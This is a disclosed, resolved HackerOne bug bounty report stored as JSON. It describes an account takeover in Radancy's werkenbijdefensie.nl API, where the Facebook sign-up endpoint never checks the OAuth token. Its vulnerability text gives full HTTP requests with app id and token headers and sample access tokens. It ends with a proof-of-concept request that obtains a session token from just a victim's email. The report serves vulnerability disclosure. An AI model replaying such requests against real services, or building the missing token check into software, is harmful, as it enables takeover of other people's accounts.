{
  "id": 240821,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDA4MjE=",
  "url": "https://hackerone.com/reports/240821",
  "title": "Ability To Takeover any account by Emaill.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-06-16T20:50:56.335Z",
  "submitted_at": "2017-06-16T20:50:56.335Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0xradi",
    "url": "/0xradi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/088/554/2dfe72db6b60dff0909ee876caf0b3cb456b9d28_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2450,
    "url": "https://hackerone.com/radancy",
    "handle": "radancy",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Radancy",
      "twitter_handle": "",
      "website": "https://radancy.nl",
      "about": "Radancy NL is a full-service agency specialised in employer branding and recruitment advertising in the Netherlands"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-07-10T15:23:05.522Z",
  "bug_reporter_agreed_on_going_public_at": "2019-07-10T15:23:05.379Z",
  "team_member_agreed_on_going_public_at": "2019-07-10T08:43:13.183Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team,\nI've found that your api ```api.werkenbijdefensie.nl``` for your ```mijn defensie``` Application do not authenticate Facebook users' probably.\nYour application doesn't check the Facebook authentication token at all, which makes any attacker able to takeover any account just by using any valid user's email address.\n\n###More Details:\nHere's the application request to auth facebook users:\n█████\n```http\nPOST /v1.1/users/sign_up_by_channel HTTP/1.1\nX-app-id: uiq3kjqbpes56os7eqxlky3f\nX-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 513\nHost: api.werkenbijdefensie.nl\nConnection: Keep-Alive\nAccept-Encoding: gzip\nUser-Agent: okhttp/3.2.0\n\nchannel=Facebook\n&user[uid]=███\n&user[info][email]=███████\n&user[info][first_name]=Ahmed&user[info][last_name]=██████\n&user[info][name]=Ahmed █████&user[info][birthday]=09/23/1996\n&user[credentials]token]=EAAE8cZCItzkcBAAXYQqnQ5YZB1LqFCzTMrQL4xrYOZAAKkuxkcZAa4sAt3TzwVRMlF4wxV30obzbZCqVG8XDm41yyIWv2wCysHa846rNKXQfRYAtZADHiNZAZA0ZBd6U9GnSJYZCg1RCCgVkOS8ywWjEHeuaKTFvgFe6yeTuPwCAZAhZAIhCatZB0dqO3HOK065qDSRWMxROqzFWndwZDZD\n&user[credentials][expires]=true\n&user[credentials][expires_at]=1502824792036\n```\n1. ```user[uid]=██████``` is user's facebook id.\ncheck this > https://www.facebook.com/████\n2.  ```user[info][email]``` > is my facebook account's email.\n3. ```&user[credentials]token]``` The authentication token.\n4. the reset information aren't important\n-------\nHere's a response example:\n\n```http\nHTTP/1.1 201 Created\nServer: nginx\nDate: Fri, 16 Jun 2017 20:28:40 GMT\nContent-Type: application/json\nContent-Length: 164\nConnection: keep-alive\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nX-XSS-Protection: 1; mode=block\nX-Permitted-Cross-Domain-Policies: master-only\nStrict-Transport-Security: max-age=31536000;\n\n{\"id\":\"5937d576b5164f04fce31d56\",\"token\":\"11ef25eb5cdb7e392d502c25ba8f24bfb4e85e55f24208795a49277d0cea2c50\",\"account_status\":\"confirmed\",\"email_status\":\"confirmed\"}\n```\n- The token in response is being used to authenticate user while exploring the application as following:  ████\n\n###POC:\nYou can preform a request as shown and still get a valid token based on my email or any other valid email on your system.\nThe request to get token : ████████\nThe request with token : ███\n\n```http\nPOST /v1.1/users/sign_up_by_channel HTTP/1.1\nX-app-id: uiq3kjqbpes56os7eqxlky3f\nX-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 70\nHost: api.werkenbijdefensie.nl\nConnection: Keep-Alive\nAccept-Encoding: gzip\nUser-Agent: okhttp/3.2.0\n\nchannel=Facebook&user[uid]={AnyNumbers}&user[info][email]=victim@email.com\n```\n\nLet me know if you need more information or a video to explain it more.\n\nBest Regards,\n@exr",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-08-09T08:43:13.241Z",
  "allow_singular_disclosure_after": -142488054.88551182,
  "singular_disclosure_allowed": true,
  "vote_count": 168,
  "voters": [
    "v8vito",
    "00ll88",
    "n42",
    "nytr0gen",
    "jarom",
    "emanuelharijanto",
    "kapytein",
    "hide_khan",
    "sameerphad72",
    "tess",
    "and 158 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
